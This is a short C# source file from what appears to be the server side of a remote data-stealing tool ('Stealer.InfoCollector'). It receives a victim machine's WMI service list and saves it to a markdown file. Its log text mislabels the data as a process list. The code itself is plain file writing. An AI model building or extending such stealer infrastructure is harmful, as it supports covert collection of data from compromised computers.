﻿using Gloom.WmiOps;
using Serilog;
using System.Text;

namespace Gloom.Server.Features.Stealer.InfoCollector.Wmi;
internal class WmiServiceList : WmiInfo
{
	public WmiServiceList() : base("svc", WmiOpCodes.ServiceList)
	{
	}

	public override async Task Handle(string from, byte[] data)
	{
		ServiceListResponse rsp = StructConvert.Bytes2Struct<ServiceListResponse>(data);
		var fileName = $"Service list of {from.Replace(':', '#')} at {DateTime.Now:yyyy-MM-dd-HH-mm-ss-ffff}.md";
		try
		{
			using var fw = new StreamWriter(fileName, false, new UTF8Encoding(false), 8192);
			fw.WriteLine("# Services");
			fw.WriteLine(rsp.List.ToMarkdownTable());
			Log.Information("Process list of {client} written to {path}.", from, fileName);
		}
		catch (Exception ex)
		{
			Log.Error(ex, "Exception during handling of wmi process list response.");
		}
	}
}